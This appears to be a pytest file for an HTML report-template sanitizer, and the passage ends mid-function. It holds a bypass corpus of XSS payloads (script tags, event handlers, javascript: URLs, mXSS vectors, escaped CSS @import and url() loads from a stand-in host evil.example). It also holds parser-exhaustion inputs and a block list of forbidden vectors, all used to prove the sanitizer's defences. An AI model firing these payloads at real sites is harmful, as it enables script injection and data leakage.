"""Report templates, the pure core (report_templates.py): placeholder vocabulary,
the HTML template checker/sanitizer, the HTML renderer, dispatch, the starter
template and upload sniffing.

The report under test is the golden 2026-09-02 sweep (the same fixture
test_vendor_report.py reads), built once per module from a temp disk store, so
no test reaches Firestore (``MR_OFFLINE=1``).

The sanitizer tests are written to fail if the sanitizer is weakened, not just
to pass while it is in place: every hostile case asserts on the OUTPUT (no
executable vector, no external URL anywhere), positive controls prove that legal
content survives, and the belt-and-braces re-sanitize is proven by making our
own renderer emit something hostile.
"""

from __future__ import annotations

import copy
import json
import re
import struct
import time
import zlib
from pathlib import Path

import pytest

from marketing_research_agent import goals, runs, snapshots
from marketing_research_agent import report_templates as rt
from marketing_research_agent import vendor_report as vr
from marketing_research_agent import vendor_report_render as vrr

FIXTURE = Path(__file__).parent / "fixtures" / "vendor_sweep_2026-09-02.json"
EVIL = "https://evil.example"


# --- harness ------------------------------------------------------------------

def _targets() -> dict:
    return {"thresholds": goals.default_thresholds(),
            "channel_goals": {k: {f: getattr(g, f) for f in goals._GOAL_FIELDS}
                              for k, g in goals.CHANNEL_GOALS.items()}}


@pytest.fixture(scope="module")
def golden(tmp_path_factory) -> dict:
    tmp = tmp_path_factory.mktemp("report_templates")
    snap_dir = tmp / "snaps"
    snap_dir.mkdir()
    (tmp / "runs").mkdir()
    for doc in json.loads(FIXTURE.read_text(encoding="utf-8"))["docs"]:
        (snap_dir / f"{doc['vendor_slug']}_{doc['date']}.json").write_text(
            json.dumps(doc), encoding="utf-8")
    with pytest.MonkeyPatch.context() as mp:
        mp.setenv("MR_OFFLINE", "1")
        mp.setenv("MR_SNAPSHOTS_DIR", str(snap_dir))
        mp.setenv("MR_RUNS_DIR", str(tmp / "runs"))
        mp.setenv("MR_TARGETS_FILE", str(tmp / "targets.json"))
        goals.invalidate_targets_cache()
        report = vr.compute(snapshots.vendor_sweep("2026-09"), targets=_targets(),
                            previous=snapshots.previous_month_sweep("2026-09"))
    goals.invalidate_targets_cache()
    return report


@pytest.fixture()
def report(golden) -> dict:
    return copy.deepcopy(golden)


def _check(html_text: str) -> rt.CheckResult:
    return rt.check_html(html_text.encode("utf-8"))


def _page(body: str, head: str = "") -> str:
    return f"<!DOCTYPE html><html><head>{head}</head><body>{body}</body></html>"


_FORBIDDEN = (
    "<script", "javascript", "vbscript", "<iframe", "<object", "<embed", "<base", "<link",
    "<form", "<input", "<button", "<template", "<noscript", "<math", "<foreignobject",
    "<animate", "<xmp", "<marquee", "<video", "<source", "srcset", "srcdoc", "@import",
    "@namespace", "expression(", "behavior", "-moz-binding", "evil.example", "xlink:href",
    'http-equiv="refresh',
)


def assert_inert(doc: str) -> None:
    """No executable vector and no external URL, anywhere in the document."""
    low = doc.lower()
    for needle in _FORBIDDEN:
        assert needle not in low, f"{needle!r} survived"
    assert not re.search(r"<set[\s/>]", low)
    assert not re.search(r"<[a-z][^<>]*\son[a-z]+\s*=", low), "an on* handler survived"
    for m in re.finditer(r"url\(\s*['\"]?([^'\")\s]*)", low):
        assert m.group(1).startswith(("data:", "#")), m.group(0)
    for m in re.finditer(r"\shref=\"([^\"]*)\"", low):
        assert m.group(1).startswith("#"), m.group(0)
    for m in re.finditer(r"\ssrc=\"([^\"]*)\"", low):
        assert m.group(1).startswith("data:image/"), m.group(0)


# --- vocabulary -------------------------------------------------------------------

def test_the_vocabulary_is_read_off_the_registry_and_the_metric_catalog():
    blocks = {n for n, p in rt.PLACEHOLDERS.items() if p.is_block}
    scalars = {n for n, p in rt.PLACEHOLDERS.items() if not p.is_block}
    assert blocks == {e.placeholder[2:-2] for e in vrr.SECTION_REGISTRY.values()}
    assert scalars == set(vrr.placeholder_vocabulary()["scalars"])
    assert set(vr.METRICS) <= scalars
    for token in ("{{total_spend}}", "{{chart:benchmark_movers}}", "{{chart:budget_vs_spend}}",
                  "{{chart:demos_by_vendor}}", "{{table:vendor_scorecard}}",
                  "{{table:action_summary}}", "{{list:standouts}}", "{{list:watch_items}}"):
        assert token in {p.token for p in rt.PLACEHOLDERS.values()}
    for p in rt.PLACEHOLDERS.values():
        assert p.description and p.kind
        assert p.kind == ("scalar" if not p.is_block
                          else vrr.SECTION_REGISTRY[p.section_type].kind)


def test_a_new_registry_section_becomes_a_placeholder_without_touching_this_module(monkeypatch):
    extra = vrr.SectionType("extra_chart", "An extra chart", "chart", True, (), {},
                            lambda c, s: "<section>x</section>")
    monkeypatch.setitem(vrr.SECTION_REGISTRY, "extra_chart", extra)
    catalog = rt._build_catalog()
    assert "chart:extra_chart" in catalog
    assert catalog["chart:extra_chart"].example({}) == "An extra chart"


def test_examples_are_the_live_values_of_a_built_report(golden):
    vocab = {e["placeholder"]: e for e in rt.vocabulary(golden)}
    spend = vr.fmt(golden["portfolio"]["total_spend"], vr.MONEY)
    assert spend.startswith("$") and vocab["{{total_spend}}"]["example"] == spend
    assert vocab["{{month_label}}"]["example"] == golden["month_label"]
    assert vocab["{{table:vendor_scorecard}}"]["example"].startswith(
        f"{len(golden['vendors'])} vendors")
    assert all(e["example"] for e in vocab.values())
    json.dumps(rt.vocabulary(golden))                         # JSON-safe for the route
    assert all(e["example"] is None for e in rt.vocabulary())


def test_an_absent_figure_example_is_an_em_dash_never_zero(report):
    report["portfolio"]["total_spend"] = None
    assert rt.PLACEHOLDERS["total_spend"].example(report) == "—"


@pytest.mark.parametrize("written, expected", [
    ("totl_spend", "{{total_spend}}"),
    ("Total_Spend", "{{total_spend}}"),
    ("table:benchmark_movers", "{{chart:benchmark_movers}}"),   # right section, wrong kind
    ("benchmark_movers", "{{chart:benchmark_movers}}"),         # kind left off
    ("chart:booked_vs_completed", "{{chart:demos_by_vendor}}"),  # matches the title
    ("chart:benchmark_mover", "{{chart:benchmark_movers}}"),
])
def test_an_unknown_name_gets_the_closest_known_placeholder(written, expected):
    assert rt.suggest(written) == expected


def test_a_name_like_nothing_gets_no_suggestion():
    assert rt.suggest("zzzz") is None


# --- check_html: refusals -----------------------------------------------------------

def test_over_512_kb_is_refused_before_parsing():
    result = rt.check_html(b"<p>{{total_spend}}</p>" + b" " * rt.HTML_MAX_BYTES)
    assert not result.can_save and result.sanitized_html == ""
    assert "512 KB" in result.errors[0].message


def test_invalid_utf8_is_refused_not_guessed():
    result = rt.check_html(b"<p>{{total_spend}} \xff\xfe caf\xe9</p>")
    assert not result.can_save
    assert "UTF-8" in result.errors[0].message


def test_a_nul_byte_is_refused():
    assert not rt.check_html(b"<p>{{total_spend}}\x00</p>").can_save


def test_a_template_with_no_placeholders_is_refused_because_it_shows_no_figures():
    result = _check(_page("<h1>Vendor report</h1><p>Spend was $2,737.</p>"))
    assert not result.can_save
    assert "no placeholders" in result.errors[0].message


def _fill(prefix: bytes, unit: bytes, suffix: bytes = b"{{total_spend}}") -> bytes:
    """``unit`` repeated up to the 512 KB cap, like the audit's payloads."""
    room = rt.HTML_MAX_BYTES - 64 - len(prefix) - len(suffix)
    return prefix + unit * (room // len(unit)) + suffix


_PATHOLOGICAL = [
    # 2026-10-09 audit (HIGH): the stdlib parser reads <style> inside <svg> as
    # text and counted nothing in it, while html5ever breaks out of the <svg> and
    # builds every tag — 72-84 s of CPU and can_save=True before the fix.
    ("audit repro svg/style",
     b"<svg><style>" + b"<b><div>" * 65530 + b"</style></svg>{{total_spend}}"),
    ("p-prefixed svg/style (passes the sniffer)",
     _fill(b"<p>x</p><svg><style>", b"<b><div>", b"</style></svg>{{total_spend}}")),
    ("math/style", _fill(b"<math><style>", b"<b><div>", b"</style></math>{{total_spend}}")),
    ("noscript", _fill(b"<noscript>", b"<b><div>", b"</noscript>{{total_spend}}")),
    ("iframe", _fill(b"<iframe>", b"<b><div>", b"</iframe>{{total_spend}}")),
    ("svg/title", _fill(b"<svg><title>", b"<b><div>", b"</title></svg>{{total_spend}}")),
    ("svg/textarea", _fill(b"<svg><textarea>", b"<b><div>",
                           b"</textarea></svg>{{total_spend}}")),
    ("comment-wrapped", _fill(b"<!--", b"<b><div>", b"-->{{total_spend}}")),
    ("divs inside svg/style",
     _fill(b"<p>x</p><svg><style>", b"<div>", b"</style></svg>{{total_spend}}")),
    # html5ever checks each attribute against the ones before it: 60k on one tag
    # cost ~7 s; content written straight into a <table> is moved out one node
    # at a time: ~4 s.
    ("60k attributes on one tag",
     b"<p " + b" ".join(b"a%d" % i for i in range(60_000)) + b">{{total_spend}}</p>"),
    ("foster-parented table content", _fill(b"<table>", b"x<b>y</b>",
                                            b"</table>{{total_spend}}")),
    ("deep nesting", b"<div>" * 60_000 + b"{{total_spend}}"),
    ("nested formatting", b"<b><div>" * 40_000 + b"{{total_spend}}"),
    ("unclosed formatting", b"<a>" * 100_000 + b"{{total_spend}}"),
    ("formatting re-opened per paragraph",
     b"<p>" + b"".join(b"<b id=b%d>" % i for i in range(60)) + b"</p>"
     + b"<p>x</p>" * 60_000 + b"{{total_spend}}"),
]


@pytest.mark.parametrize("label, raw", _PATHOLOGICAL, ids=[c[0] for c in _PATHOLOGICAL])
def test_pathological_markup_is_refused_before_the_parser_burns_cpu(label, raw):
    # Unguarded, html5ever spends ~90 s on 512 KB of <b><div> and ~26 s on the
    # re-opened formatting case; the work meter refuses each in milliseconds.
    rt.check_html(b"<p>{{total_spend}}</p>")                   # worker already running
    started = time.perf_counter()
    result = rt.check_html(raw[: rt.HTML_MAX_BYTES])
    assert time.perf_counter() - started < 2.0, label
    assert not result.can_save, label
    assert result.sanitized_html == ""
    # The meter alone, in this process, before any parser: also milliseconds.
    started = time.perf_counter()
    with pytest.raises(rt._TooComplex):
        rt._measure(raw[: rt.HTML_MAX_BYTES].decode("utf-8"))
    assert time.perf_counter() - started < 2.0, label


@pytest.mark.parametrize("markup", [
    "<svg><style><b>x</b></style></svg>",
    "<svg><style>a{} </style><title>t<i>x</i></title></svg>",
    "<math><style><div></div></style></math>",
    "<svg><g><textarea><p>x</p></textarea></g></svg>",
])
def test_inside_svg_or_math_a_rawtext_element_may_hold_only_text(markup):
    result = _check(_page(markup + "<p>{{total_spend}}</p>"))
    assert not result.can_save
    assert "may hold only plain text" in result.errors[0].message


_ORDINARY = [
    ("svg with style and title", "<svg><style>.a{fill:red}</style><title>Spend chart</title>"
                                 "<rect width='1' height='1'/></svg>"),
    ("css child combinator", "<style>a > b { color: red }</style><title>T</title>"),
    ("2000 self-closed svg shapes", "<svg>" + "<rect width='1' height='1'/>" * 2_000 + "</svg>"),
    ("2000 table rows", "<table>" + "<tr><td>x</td></tr>" * 2_000 + "</table>"),
    ("3000 implicitly closed li", "<ul>" + "<li>x" * 3_000 + "</ul>"),
]


@pytest.mark.parametrize("label, markup", _ORDINARY, ids=[c[0] for c in _ORDINARY])
def test_ordinary_markup_stays_under_the_meter(label, markup):
    result = _check(_page(markup + "<p>{{total_spend}}</p>"))
    assert result.can_save, result.errors


def test_a_check_that_runs_past_its_budget_is_refused_and_the_worker_replaced(
        monkeypatch):
    template = _page("<p>{{total_spend}}</p>").encode()
    assert rt.check_html(template).can_save                    # a live worker
    before = rt._CHECKER._proc
    # A legitimate file that takes the worker a few hundred ms, against a
    # 10 ms budget (well above Windows' timer resolution, far below the work).
    slow = _page("<p>{{total_spend}}</p>" + "<p>x</p>" * 50_000).encode()
    monkeypatch.setenv("MR_TEMPLATE_CHECK_BUDGET_S", "0.01")
    result = rt.check_html(slow)
    assert not result.can_save and "too complex to check" in result.errors[0].message
    assert rt._CHECKER._proc is None and before.poll() is not None   # killed, not left running
    monkeypatch.delenv("MR_TEMPLATE_CHECK_BUDGET_S")
    assert rt.check_html(template).can_save                    # a fresh worker answers


def test_a_checker_that_cannot_start_fails_closed(monkeypatch):
    rt._CHECKER.shutdown()
    monkeypatch.setattr(rt, "_WORKER_BOOT", "import sys; sys.exit(3)")
    with pytest.raises(rt.TemplateCheckUnavailable):
        rt.check_html(_page("<p>{{total_spend}}</p>").encode())
    monkeypatch.undo()
    assert rt.check_html(_page("<p>{{total_spend}}</p>").encode()).can_save


def test_the_budget_setting_is_read_per_call_and_falls_back_on_nonsense(monkeypatch):
    monkeypatch.delenv("MR_TEMPLATE_CHECK_BUDGET_S", raising=False)
    assert rt.check_budget() == rt._DEFAULT_CHECK_BUDGET_S
    for raw, expected in (("3", 3.0), ("0", rt._DEFAULT_CHECK_BUDGET_S),
                          ("abc", rt._DEFAULT_CHECK_BUDGET_S), ("-1", rt._DEFAULT_CHECK_BUDGET_S)):
        monkeypatch.setenv("MR_TEMPLATE_CHECK_BUDGET_S", raw)
        assert rt.check_budget() == expected, raw


def test_errors_are_capped_with_a_count_of_the_rest():
    result = _check(_page("<p>{{nope}}</p>" * (rt.MAX_ERRORS + 20)))
    assert len(result.errors) == rt.MAX_ERRORS + 1
    assert result.errors[-1].message == "…and 20 more."


# --- check_html: placeholder positions ------------------------------------------------

_POSITIONS = """<!DOCTYPE html>
<html><head><title>Report {{month_label}}</title>
<style>.x{content:"{{total_spend}}"}</style></head>
<body>
<!-- {{total_leads}} -->
<a title="{{qualified_leads}}" href="#x">x</a>
<p>Spend {{chart:benchmark_movers}}</p>
<div>Text {{table:vendor_scorecard}}</div>
<p>{{totl_spend}}</p>
<div>{{chart:booked_vs_completed}}</div>
<p>{{total_spend}}</p>
{{list:standouts}}
<svg><text>{{tiles:portfolio_glance}}</text></svg>
<div>
  {{list:watch_items}}
</div>
</body></html>
"""


def test_every_misplaced_or_unknown_placeholder_is_an_error_on_its_own_line():
    result = _check(_POSITIONS)
    by_line = {e.line: e for e in result.errors}
    assert not result.can_save
    assert "inside the <title>" in by_line[2].message
    assert "inside a <style> block" in by_line[3].message
    assert "inside a comment" in by_line[5].message
    assert "title attribute of <a>" in by_line[6].message
    assert by_line[7].placeholder == "{{chart:benchmark_movers}}"
    assert "can't sit inside <p>" in by_line[7].message
    assert "only thing inside its element" in by_line[8].message
    assert by_line[9].placeholder == "{{totl_spend}}"
    assert by_line[9].suggestion == "{{total_spend}}"
    assert by_line[10].suggestion == "{{chart:demos_by_vendor}}"
    assert "loose in the page body" in by_line[12].message
    assert "inside an <svg>" in by_line[13].message
    assert 11 not in by_line and 15 not in by_line         # the two that are fine
    assert {e.line for e in result.errors} == {2, 3, 5, 6, 7, 8, 9, 10, 12, 13}
    assert result.placeholders_used == ("{{total_spend}}", "{{list:watch_items}}")


def test_a_placeholder_never_survives_in_an_attribute_even_unsaved():
    result = _check(_page('<a title="{{total_spend}}" class="{{x}}" href="#a">a</a>'
                          "<p>{{total_spend}}</p>"))
    assert "title=" not in result.sanitized_html and "class=" not in result.sanitized_html


def test_a_placeholder_inside_removed_markup_is_named_not_silently_lost():
    result = _check(_page("<p>{{title}}</p><template><p>{{total_spend}}</p></template>"))
    errs = [e for e in result.errors if e.placeholder == "{{total_spend}}"]
    assert errs and "removed" in errs[0].message


def test_a_block_alone_in_a_container_is_fine_with_whitespace_around_it():
    result = _check(_page("<section>\n  {{chart:benchmark_movers}}\n</section>"
                          "<table><tr><td>{{table:vendor_scorecard}}</td></tr></table>"))
    assert result.can_save, result.errors
    assert result.placeholders_used == ("{{chart:benchmark_movers}}",
                                        "{{table:vendor_scorecard}}")


def test_placeholders_tolerate_inner_spaces():
    result = _check(_page("<p>{{ total_spend }}</p>"))
    assert result.can_save and result.placeholders_used == ("{{total_spend}}",)


# --- check_html: the sanitizer ----------------------------------------------------------

# Each case is wrapped in a page that also uses {{total_spend}}, so most of them
# are otherwise saveable and are rendered too.
CORPUS = [
    ("script", "<script>alert(1)</script>"),
    ("script src upper", f"<SCRIPT SRC={EVIL}/x.js></SCRIPT>"),
    ("script mixed case", "<ScRiPt>alert(1)</sCrIpT>"),
    ("script slash attr", f'<script/src="{EVIL}/x.js"></script>'),
    ("svg script", "<svg><script>alert(1)</script></svg>"),
    ("svg onload", '<svg onload=alert(1)><rect width="1" height="1"/></svg>'),
    ("img onerror", "<img src=x onerror=alert(1)>"),
    ("img onerror eval", "<img src=x:alert(alt) onerror=eval(src) alt=1>"),
    ("javascript tab entity", '<a href="jav&#x09;ascript:alert(1)">x</a>'),
    ("javascript char ref", '<a href="&#106;avascript:alert(1)">x</a>'),
    ("javascript leading space", '<a href=" javascript:alert(1)">x</a>'),
    ("javascript mixed case", '<a href="JaVaScRiPt:alert(1)">x</a>'),
    ("vbscript", '<a href="vbscript:msgbox(1)">x</a>'),
    ("data html href", '<a href="data:text/html,<script>alert(1)</script>">x</a>'),
    ("data html img", '<img src="data:text/html;base64,PHNjcmlwdD4=">'),
    ("base href", f'<base href="{EVIL}/">'),
    ("meta refresh", f'<meta http-equiv="refresh" content="0;url={EVIL}/">'),
    ("external img + srcset", f'<img src="{EVIL}/a.png" srcset="{EVIL}/b.png 2x">'),
    ("protocol-relative href", '<a href="//evil.example/x">x</a>'),
    ("relative src", '<img src="evil.example.png">'),
    ("style @import url", f"<style>@import url({EVIL}/x.css);</style>"),
    ("style @import string", f'<style>@import "{EVIL}/x.css";</style>'),
    ("style @import escaped", rf"<style>@\69mport url({EVIL}/x.css);</style>"),
    ("style @import in @media", f"<style>@media print{{@import url({EVIL}/x.css);}}</style>"),
    ("style @namespace", f"<style>@namespace url({EVIL});</style>"),
    ("style background url", f"<style>body{{background:url({EVIL}/bg.png)}}</style>"),
    ("style u\\72l( escape", rf"<style>body{{background:u\72l({EVIL}/bg.png)}}</style>"),
    ("style all-hex url escape", rf'<style>a{{background:\75\72\6c("{EVIL}/x")}}</style>'),
    ("style six-digit escape", rf"<style>a{{background:\000075rl({EVIL}/x)}}</style>"),
    ("style protocol-relative", "<style>a{background:url(//evil.example/x.png)}</style>"),
    ("style image-set", f'<style>.x{{background:image-set("{EVIL}/a.png" 1x)}}</style>'),
    ("style src()", f'<style>a{{background:src("{EVIL}/s.png")}}</style>'),
    ("style font-face", f"<style>@font-face{{font-family:x;src:url({EVIL}/f.woff2)}}</style>"),
    ("style cursor", f"<style>a{{cursor:url({EVIL}/c.cur),auto}}</style>"),
    ("style -moz-binding", f"<style>a{{-moz-binding:url({EVIL}/x.xml#x)}}</style>"),
    ("style escaped behavior", rf"<style>a{{b\65havior:url({EVIL}/x.htc)}}</style>"),
    ("style -moz-document", "<style>@-moz-document url-prefix(){a{color:red}}</style>"),
    ("style closes early", f"<style>x{{background:url({EVIL}/</style>"
                           "<script>alert(1)</script>)}</style>"),
    ("svg style import", f"<svg><style>@import url({EVIL}/x.css);</style></svg>"),
    ("inline url", f"<div style=\"background-image:url('{EVIL}/x.png')\">x</div>"),
    ("inline url entity quotes", f'<div style="background:url(&quot;{EVIL}/x&quot;)">x</div>'),
    ("inline url spaced", f'<div style="background:url(  {EVIL}/x  )">x</div>'),
    ("inline javascript url", '<div style="background:url(javascript:alert(1))">x</div>'),
    ("inline expression", '<div style="width:expression(alert(1))">x</div>'),
    ("inline expression split by comment", '<a href="#x" style="x:expr/**/ession(alert(1))">x</a>'),
    ("inline behavior", f'<div style="behavior:url({EVIL}/x.htc)">x</div>'),
    ("mXSS math/mglyph/style", "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>"),
    ("mXSS svg/p/style", '<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">'),
    ("template", "<template><script>alert(1)</script><img src=x onerror=1></template>"),
    ("noscript", '<noscript><p title="</noscript><img src=x onerror=alert(1)>">'),
    ("iframe srcdoc", '<iframe srcdoc="<script>alert(1)</script>"></iframe>'),
    ("link stylesheet", f'<link rel="stylesheet" href="{EVIL}/x.css">'),
    ("object + embed", f'<object data="{EVIL}/x.swf"></object><embed src="{EVIL}/x">'),
    ("form + input", f'<form action="{EVIL}/"><input name=x>'
                     f'<button formaction="{EVIL}">go</button></form>'),
    ("svg use external", f'<svg><use href="{EVIL}/s.svg#x"/>'
                         f'<use xlink:href="{EVIL}/s.svg#x"/></svg>'),
    ("svg a xlink javascript", '<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>'),
    ("svg animate/set", '<svg><animate attributeName="href" values="javascript:alert(1)"/>'
                        '<set attributeName="onload" to="alert(1)"/></svg>'),
    ("svg foreignObject", f'<svg><foreignObject><iframe src="{EVIL}"></iframe>'
                          "</foreignObject></svg>"),
    ("svg fill external", f'<svg><rect fill="url({EVIL}/p.svg#g)" width="1" height="1"/></svg>'),
    ("svg style fill external",
     f'<svg><rect style="fill:url({EVIL}/p.svg#g)" width="1" height="1"/></svg>'),
    ("comment", "<!--<script>alert(1)</script>-->"),
    ("details ontoggle", "<details open ontoggle=alert(1)>x</details>"),
    ("marquee onstart", "<marquee onstart=alert(1)>x</marquee>"),
    ("body onload", "<body onload=alert(1)>"),
    ("video source onerror", "<video><source onerror=alert(1)></video>"),
    ("xmp", "<xmp><script>alert(1)</script></xmp>"),
]


@pytest.mark.parametrize("label, hostile", CORPUS, ids=[c[0] for c in CORPUS])
def test_the_bypass_corpus_comes_out_inert_checked_and_rendered(label, hostile, golden):
    result = _check(_page(f"<div>{hostile}</div><p>{{{{total_spend}}}}</p>",
                          head="<title>T</title>"))
    assert_inert(result.sanitized_html)
    # A cleaned template is a fixed point: cleaning it again changes nothing.
    # (Some cases are refused outright and have no cleaned output at all.)
    if result.sanitized_html:
        assert _check(result.sanitized_html).sanitized_html == result.sanitized_html
    if result.can_save:
        assert_inert(rt.render_html_template(result.sanitized_html, golden))


def test_the_corpus_is_at_least_25_cases():
    assert len(CORPUS) >= 25


def test_removal_counts_name_what_was_taken_out():
    result = _check(_page(
        "<script>alert(1)</script>"
        '<img src="x" onerror="alert(1)" onload="x">'
        '<a href="javascript:alert(1)">j</a>'
        f'<a href="{EVIL}/">e</a>'
        "<iframe></iframe><!-- c -->"
        f"<p style=\"color:red;background:url({EVIL}/x)\">{{{{total_spend}}}}</p>",
        head=f"<style>@import url({EVIL}/x.css);a{{color:red}}</style>"))
    removed = result.removed
    assert set(removed) == set(rt.REMOVED_KEYS)
    assert removed["scripts"] == 1
    assert removed["handlers"] == 2
    assert removed["unsafe_urls"] == 1
    assert removed["external_urls"] == 4          # img src, a href, inline url(), @import
    assert removed["elements"] == 1               # the iframe
    assert removed["comments"] == 1
    assert removed["css_rules"] == 2              # @import + the inline background
    assert result.can_save


def test_legal_content_survives_cleaning():
    png = "data:image/png;base64,iVBORw0KGgo="
    result = _check(_page(
        '<h1 id="top" class="t">Report</h1>'
        f'<p class="lead" style="color:#123456;margin:0 0 4px">{{{{total_spend}}}}</p>'
        f'<img src="{png}" alt="logo" width="40">'
        '<a href="#top">back to top</a>'
        '<table><tr><th colspan="2" scope="col">A</th></tr></table>'
        '<svg viewBox="0 0 10 10"><defs><linearGradient id="g"><stop offset="0" '
        'stop-color="#fff"/></linearGradient></defs><rect fill="url(#g)" x="1" '
        'width="5" height="5"/><text x="1" y="9" font-size="3">hi</text></svg>',
        head="<title>My report</title><style>@font-face{font-family:x;"
             "src:url(data:font/woff2;base64,AAAA)}:root{--ink:#000}"
             ".x{clip-path:url(#g)}@media print{.y{color:red}}</style>"))
    assert result.can_save and result.removed == dict.fromkeys(rt.REMOVED_KEYS, 0)
    out = result.sanitized_html
    for kept in ('id="top"', 'class="t"', 'style="color:#123456;margin:0 0 4px"',
                 f'src="{png}"', 'alt="logo"', 'width="40"', '<a href="#top">',
                 'colspan="2"', 'viewBox="0 0 10 10"', "<linearGradient", 'fill="url(#g)"',
                 "<title>My report</title>", "url(data:font/woff2;base64,AAAA)",
                 ":root{--ink:#000}", ".x{clip-path:url(#g)}", "@media print{.y{color:red}}"):
        assert kept in out, kept


# --- CSS cleaner ------------------------------------------------------------------------

def test_the_css_cleaner_drops_only_the_unsafe_declaration():
    css = f"a{{color:red;background:url({EVIL}/x);margin:0}}b{{color:blue}}"
    assert rt.clean_css(css) == "a{color:red;margin:0}b{color:blue}"


@pytest.mark.parametrize("css", [
    rf"a{{background:u\72l({EVIL}/x)}}",
    rf'a{{background:\75\72\6c("{EVIL}/x")}}',
    rf"a{{background:\000075rl({EVIL}/x)}}",
    rf"a{{background:\55RL({EVIL}/x)}}",
    rf"@\69mport url({EVIL}/x.css);",
    rf"@\49MPORT '{EVIL}/x.css';",
    rf"a{{b\65havior:url(x.htc)}}",
    "a{width:e\\78pression(alert(1))}",
    f"a{{background:url( '{EVIL}/x' )}}",
    f"a{{background:-webkit-image-set(url({EVIL}/a.png) 1x)}}",
    f"a{{mask:cross-fade(url(data:image/png;base64,AA),'{EVIL}/b.png')}}",
    # 2026-10-09 audit (LOW): a URL routed through a custom property.
    f'.a{{--u:"{EVIL}/x.png"}}.b{{background:image-set(var(--u) 1x)}}',
    ".b{background:image-set(var(--u) 1x)}",
    ".b{background:url(var(--u))}",
    ".b{mask:src(var(--u))}",
    ".b{background:cross-fade(attr(data-x),url(data:image/png;base64,AA))}",
    f'.a{{--u:"//evil.example/x"}}',
    '.a{--u:"evil.example.png"}',
])
def test_escaped_and_disguised_css_urls_are_seen_the_way_a_browser_decodes_them(css):
    out = rt.clean_css(css)
    assert "evil.example" not in out and "pression" not in out and "havior" not in out
    assert "mport" not in out.lower()


def test_custom_properties_keep_plain_text_and_data_urls():
    css = ('.a{--label:"Total";--note:"Note: see below";'
           '--w:"data:image/png;base64,AA";--ink:#000}'
           '.b{background:image-set("data:image/png;base64,AA" type("image/png") 1x)}')
    assert rt.clean_css(css) == css


def test_css_keeps_data_urls_fragments_comments_and_nesting():
    css = ("/* licence */@font-face{font-family:F;src:url(data:font/woff2;base64,AAAA) "
           "format('woff2')}.a{fill:url(#g)}.b{.c{color:red}}")
    assert rt.clean_css(css) == css


def test_css_that_could_close_the_style_element_is_neutralised():
    assert "</style" not in rt._guard_style_text("a{content:'</style><script>'}").lower()


def test_absurd_css_nesting_is_dropped_not_a_recursion_error():
    out = rt.clean_css("a{" * 5000 + "color:red" + "}" * 5000 + "b{color:blue}")
    assert out.endswith("b{color:blue}")


def test_inline_css_may_not_open_a_block():
    assert rt.clean_inline_css("color:red;a{color:blue}") == "color:red;"


# --- rendering an HTML template -----------------------------------------------------------

def _render(body: str, report: dict, head: str = "") -> str:
    result = _check(_page(body, head))
    assert result.can_save, result.errors
    return rt.render_html_template(result.sanitized_html, report)


def test_the_csp_meta_is_the_first_element_of_head(golden):
    out = _render("<p>{{total_spend}}</p>", golden)
    assert re.search(r"<head>(<[^>]+>)", out).group(1) == rt.CSP_META
    assert rt.CSP == ("default-src 'none'; style-src 'unsafe-inline'; img-src data:; "
                      "font-src data:")
    assert out.startswith("<!DOCTYPE html>")


def test_scalars_are_the_reports_formatted_figures(golden):
    out = _render('<p id="s">{{total_spend}}</p><p id="m">{{month_label}}</p>', golden)
    spend = vr.fmt(golden["portfolio"]["total_spend"], vr.MONEY)
    assert f'<p id="s">{spend}</p>' in out
    assert f'<p id="m">{golden["month_label"]}</p>' in out
    assert "{{" not in out


def test_missing_values_render_as_the_em_dash_marker(report):
    report["portfolio"]["total_spend"] = None
    report["month_label"] = None
    out = _render('<p id="s">{{total_spend}}</p><p id="m">{{month_label}}</p>', report)
    # The renderer's own marker (taken from its public API, so the two can't
    # drift), as html5ever re-serializes it: the entity becomes the character.
    assert "&#8212;" in rt.ABSENT_MARKER
    dash = rt.ABSENT_MARKER.replace("&#8212;", "—")
    assert f'<p id="s">{dash}</p>' in out
    assert f'<p id="m">{dash}</p>' in out
    assert '<p id="s">$0</p>' not in out and '<p id="s"></p>' not in out


def test_a_value_containing_a_placeholder_or_markup_stays_inert(report):
    report["title"] = "{{total_spend}}<script>alert(1)</script>"
    report["vendors"][0]["name"] = "{{total_spend}}<img src=x onerror=alert(1)>"
    out = _render('<p id="t">{{title}}</p><div>{{table:vendor_scorecard}}</div>', report)
    assert '<p id="t">{{total_spend}}&lt;script&gt;alert(1)&lt;/script&gt;</p>' in out
    assert "<td>{{total_spend}}&lt;img src=x onerror=alert(1)&gt;</td>" in out
    assert_inert(out)


def test_the_final_document_is_sanitized_again_even_if_our_own_renderer_misbehaves(
        golden, monkeypatch):
    # Proves the belt-and-braces pass is load-bearing: make OUR renderer emit
    # hostile markup and the document still comes out inert.
    monkeypatch.setattr(vrr, "render_block", lambda *a, **k: (
        f'<section><script>alert(1)</script><img src="{EVIL}/x" onerror="alert(1)">'
        f'<style>@import url({EVIL}/x.css);</style><a href="javascript:x">j</a></section>'))
    monkeypatch.setattr(vrr, "render_scalar", lambda *a, **k: "<script>alert(2)</script>")
    out = _render("<p>{{total_spend}}</p><div>{{chart:benchmark_movers}}</div>", golden)
    assert_inert(out)


def test_html_stored_without_checking_is_cleaned_at_render_time(golden):
    raw = ('<p onclick="alert(1)">{{total_spend}}</p><script>alert(1)</script>'
           f'<style>@import url({EVIL}/x.css);</style><a href="{EVIL}">x</a>')
    assert_inert(rt.render_html_template(raw, golden))


def test_a_stored_template_with_a_retired_placeholder_fails_loudly(golden):
    with pytest.raises(rt.TemplateRenderError) as err:
        rt.render_html_template("<p>{{retired_metric}}</p>", golden)
    assert "{{retired_metric}}" in err.value.reason


def test_blocks_are_our_svg_in_the_templates_declared_colours(golden):
    themed = _render("<div>{{chart:benchmark_movers}}</div>", golden,
                     head="<style>:root{--pos:#00AA11;--neg:#AA0011}</style>")
    plain = _render("<div>{{chart:benchmark_movers}}</div>", golden)
    themed_fills = set(re.findall(r'fill="([^"]+)"', themed))
    plain_fills = set(re.findall(r'fill="([^"]+)"', plain))
    assert any(m["beating"] for m in golden["movers"])
    assert any(not m["beating"] for m in golden["movers"])
    assert {"#00AA11", "#AA0011"} <= themed_fills
    assert vrr.PALETTE["pos"] not in themed_fills and vrr.PALETTE["neg"] not in themed_fills
    assert {vrr.PALETTE["pos"], vrr.PALETTE["neg"]} <= plain_fills
    assert "<svg" in themed and themed.count('class="mrb"') >= 1


def test_theme_tokens_are_plain_colours_on_root_only():
